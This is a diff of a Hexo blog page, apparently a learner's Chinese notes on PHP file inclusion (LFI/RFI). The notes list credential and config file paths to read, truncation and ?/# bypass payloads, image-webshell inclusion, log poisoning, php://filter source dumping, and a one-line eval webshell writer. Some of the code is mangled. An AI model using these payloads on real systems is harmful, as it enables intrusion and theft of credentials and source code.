@@ -8,7 +8,7 @@
     <link rel="apple-touch-icon" sizes="76x76" href="/null">
     <link rel="icon" type="image/png" href="/null">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
-    <title>归档 - Hexo</title>
+    <title>文件包含漏洞 - Hexo</title>
     
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
     
@@ -404,83 +404,97 @@ header .header__right .dropdown-menus .dropdown-menu {
             
 
 <article class="page">
-  <div class="archive-list">
-    <p class="h4">共计 11 篇文章</p>
-    <hr>
+<div id="post-meta-m">
+    <div class="post-meta" id="post-meta">
+  <h3>文件包含漏洞</h3>
     
-    
-      
-        
-        <p class="h5">2022</p>
-      
-      <a href="/2022/04/20/xss%E6%BC%8F%E6%B4%9E/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">xss漏洞</span>
-        <time style="float: right;">04-20</time>
-      </a>
-    
-      
-      <a href="/2022/04/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">文件包含漏洞</span>
-        <time style="float: right;">04-20</time>
-      </a>
-    
-      
-      <a href="/2022/04/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-webshell/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">文件上传漏洞 webshell</span>
-        <time style="float: right;">04-13</time>
-      </a>
-    
-      
-      <a href="/2022/04/13/%E7%BB%95%E8%BF%87waf%E6%8A%80%E5%B7%A7/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">绕过waf技巧</span>
-        <time style="float: right;">04-13</time>
-      </a>
-    
-      
-      <a href="/2022/04/06/sql-lib/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">sql-lib</span>
-        <time style="float: right;">04-06</time>
-      </a>
-    
-      
-      <a href="/2022/03/29/sqlmap/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">sqlmap</span>
-        <time style="float: right;">03-29</time>
-      </a>
-    
-      
-      <a href="/2022/03/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8F%92%E4%BB%B6/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">渗透测试插件</span>
-        <time style="float: right;">03-21</time>
-      </a>
-    
-      
-      <a href="/2022/03/15/mysql/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">mysql</span>
-        <time style="float: right;">03-15</time>
-      </a>
-    
-      
-      <a href="/2022/03/14/PHP/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">PHP</span>
-        <time style="float: right;">03-14</time>
-      </a>
-    
-      
-      <a href="/2022/03/14/Linux/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">Linux</span>
-        <time style="float: right;">03-14</time>
-      </a>
-    
-
-    <nav aria-label="navigation">
-      <span class="pagination" id="pagination">
-        <span class="page-number current">1</span><a class="page-number" href="/archives/2022/page/2/">2</a><a class="extend next" rel="next" href="/archives/2022/page/2/">&gt;</a>
+      <span class="post-meta-label">
+        John Doe
       </span>
-    </nav>
+    
+    
+      <span class="post-meta-label">
+        <span class="p-dot"></span>
+        <time datetime="2022-04-20 09:15" pubdate>
+          2022-04-20
+        </time>
+      </span>
+    
+    
+      
+      <span class="post-meta">
+        <span class="p-dot"></span>
+        共 1.3k 字
+      </span>
+    
+    
+    
+  </div>
+  
+</div>
+<div class="article-m">
+  <div class="post-toc">
+    
+      
+    
+  </div>
+    <div id="article">
+      <div id="post-content" class="markdown-body textretty">
+        <p>一、什么是文件包含漏洞？</p>
+<p>1、文件包含概述</p>
+<p>和SQL注入等攻击方式一样，文件包含漏洞也是一种“注入型漏洞”，其本质就是输入一段用户能够控制的脚本或者代码，并让服务器端执行。</p>
+<p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程就叫做包含。</p>
+<p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
+<p>以PHP为例，常用的文件包含函数有以下四种：</p>
+<p>include()，require()，include_once()，require_once()</p>
+<p>区别如下：</p>
+<pre><code>require()，找不到被包含的文件时会产生致命错误，并停止脚本运行。
+include()，找不到被包含的文件时只会产生警告，脚本将继续运行。
+include_once()与include()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。
+require_once()与require()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。
+</code></pre>
+<p>二.本地文件包含漏洞<br>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞（LFI）。<br>（1）使用绝对路径<br>使用绝对路径直接进行读取：<br>2）使用相对路径进行读取：<br>当前页面所在路径为C:\Apache24\htdocs\，我们需要使用…/退到C盘再进行访问，构造路径如下：<br>…/…/windows/system.ini<br>（3）一些常见的敏感信息路径：<br>Windows系统：<br>    c:\boot.ini // 查看系统版本<br>    c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件<br>    c:\windows\repair\sam // 存储Windows系统初次安装的密码<br>    c:\ProgramFiles\mysql\my.ini // MySQL配置<br>    c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码<br>    c:\windows\php.ini // php 配置信息<br>Linux/Unix系统：<br>    /etc/passwd // 账户信息<br>    /etc/shadow // 账户密码文件<br>    /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件<br>    /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置<br>    /usr/local/app/php5/lib/php.ini // PHP相关配置<br>    /etc/httpd/conf/httpd.conf // Apache配置文件<br>    /etc/my.conf // mysql 配置文件<br>    ◆本地文件包含(LFI)<br>有限制本地文件包含漏洞绕过&gt;绕过方法<br>路径长度截断<br>·条件:1、Windows下要长于256字节，超出的部分会被丢弃<br>    2、Linux下要长于4096字节，超出的部分会被丢弃。<br>192.168.152.143/action2.php?action=phpifo.php/./././././././././././././././././././././././././././././<br>00截断<br>如果我们想通过文件包含漏洞读取本地敏感信息，就会遇到一些问题。因为服务器会给路径加上./site/路径，以及.php后缀。<br>此时我们可以使用使用%00截断：<br>%00为结束符，在filename后带上%00，就可以截断末尾的.php。<br>当前路径为./site/，如果要读取system.ini，则需要输入：…/…/…/windows/system.ini%00，<br>需要注意的是，%00截断需要php版本小于5.3.4，且关闭magic_quotes_gpc功能</p>
+<p>2、配合文件上传使用<br>有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。<br>编辑一个图片马，找到上传点进行上传，文件保存的完整路径为：<br>C:\phpStudy\WWW\hackable\uploads\webshell.jpg<br>找到具有文件包含漏洞的页面  该页面用于读取C:\phpStudy\WWW\vulnerabilities\fi\路径中的文件 现在我们利用该页面去执行我们上传的图片马，路径需要从C:\phpStudy\WWW\vulnerabilities\fi\ 转到C:\phpStudy\WWW\hackable\uploads\webshell.jpg<br>192.168.211.151/vulnerabilities/fi/?page=../../hackable/uploads/webshell.jpg<br>使用webshell管理工具连接即可。</p>
+<p>远程文件包含(RFI)<br>远程包含的意思<br>·指的是能够包含远程服务器上的文件并执行，可以通过http(s)或者ftp 等方式，远程加载文性。危害<br>·由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。包含条件<br>. allow_url_include=On（默认为OFF，需要在php.ini中手动打开)- allow _url_fopen = On（是否允许打开远程文件)<br>·用户可以动态控制变量</p>
+<blockquote>
+<p>举例:<br>。[URL]?path=<a target="_blank" rel="noopener" href="http://ip/info.php//%E9%80%9A%E8%BF%87http%E5%8D%8F%E8%AE%AE%E5%8A%A0%E8%BD%BD%E7%9B%AE%E6%A0%87%E6%9C%BA%E4%B8%AD%E7%9A%84info.php%E6%96%87%E4%BB%B6">http://ip/info.php//通过http协议加载目标机中的info.php文件</a><br>·[URL]?path=ftp://用户名:密码@ip/info.php //通过ftp协议加载目标机中的info.php文件<br>文件包含漏洞的利用<br>远程文件包含(RFI)<br>有限制远程文件包含漏洞绕过绕过方法<br>1.问号绕过</p>
+</blockquote>
+<ul>
+<li>payload : ?action=<a target="_blank" rel="noopener" href="http://192.168.152.143/phpinfo.php">http://192.168.152.143/phpinfo.php</a>?</li>
+</ul>
+<p>2.#号绕过</p>
+<ul>
+<li>payload : ?action=<a target="_blank" rel="noopener" href="http://192.168.152.143/phpinfo.php%23">http://192.168.152.143/phpinfo.php%23</a></li>
+</ul>
+<p>文件包含漏洞的利用<br>漏洞的利用<br>1、端口探测<br>. url=dict//ip:802<br>2.包含上传的getshell<br>·上传图片马，利用文件包含我们的图片马，菜刀连接<br>3、包含日志文件GetShell<br>·为了避免在web中进行了url编码，进行报错，把报错信息写进日志<br>4、远程文件包含写shell<br><?php
+fputs(fopen('shell.php"; 'w'),'<?php eval($_POST[1]);?>‘);<br>?&gt;<br>·在文件夹下会看到生成shell.php.内容为<?php eval($_POST[1');?>，当直接包含图片时，代码就会被执行<br>5、使用PHP伪协议GetShell<br>php://filter<br>·用途:常用于读取文件/源码<br>·使用条件:allow..url..fopen : off/on<br>allow..url..include : off/on两个配置都为off的情况下是可以正常使用的<br>·使用:[?path=php://filter/read=convert.base64-encode/resource=文件.php]<br>·注意∶通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码。虽然不能直接获取到shell ,但能读取敏感文件。</p>
+
+      </div>
+    </div>
+</div>
+
+
+<div class="post-footer">
+  
+  <div class="donate text-center">
+    <span></span>
+    <div class="donate-way">
+      
+    </div>
+  </div>
+  
 
 </div>
+
+    <!-- Comments -->
+    <div class="comments">
+        
+        
+    </div>
+
 </article>
+
+
         </div>
         
 <footer class="text-center">
@@ -497,6 +511,8 @@ header .header__right .dropdown-menus .dropdown-menu {
 </footer>
 
 <div class="p-btn">
+    
+        <a class="toc-btn" id="toc-btn"><i id="i-menu"></i></a>
     
     <a href="#top" class="click-btn">
       <i id="i-up"></i>
@@ -532,8 +548,50 @@ header .header__right .dropdown-menus .dropdown-menu {
 </script>
 
 
+<script>
+    var postImg = document.querySelectorAll("article[class=page] img");
+    for (let imgi = 0; imgi < postImg.length; imgi++) {
+        postImg[imgi].onclick = () => {
+            let zoomImg = document.createElement("div");
+            zoomImg.id = "zoomImg";
+            zoomImg.innerHTML = `<div id="zoom-picture"></div>
+    <div class="poptrox-overlay"
+        style="position: fixed; left: 0px; top: 0px; z-index: 20000; width: 100%; height: 100%; text-align: center; cursor: zoom-out; opacity: 1;">
+        <div style="display:inline-block;height:100%;vertical-align:middle;"></div>
+        <div
+            style="position:absolute;left:0;top:0;width:100%;height:100%;background:#000000;opacity:0;filter:alpha(opacity=0);">
+        </div>
+        <div class="poptrox-popup"
+            style="display: inline-block; vertical-align: middle; position: relative; z-index: 1; cursor: zoom-out; min-width: 10px; min-height: 10px; width: auto; height: auto;">
+            <div class="loader" style="display: none;"></div>
+            <div class="pic" style="text-indent: 0px;"><img
+                    src="${ postImg[imgi].srcset || postImg[imgi].src }" alt="Loading..."
+                    style="vertical-align: bottom; max-width: 85vw; max-height: 85vh;"></div>
+        </div>
+    </div>`;
+            document.body.appendChild(zoomImg);
+                document.querySelector("#zoomImg").onclick = () => {
+                    document.querySelector("#zoomImg").remove();
+                }
+        }
+    }
+    
+</script>
 
 
+
+
+    <script>
+        query("#toc-btn")[0].onclick = () => {
+            if (query(".post-toc")[0].innerHTML) {
+                toggleClass(".post-toc", "display-inline");
+            }
+        }
+
+        if (!query(".post-toc")[0].innerHTML) {
+            addClass("#toc-btn","display-none");
+        }
+    </script>
 
 
 
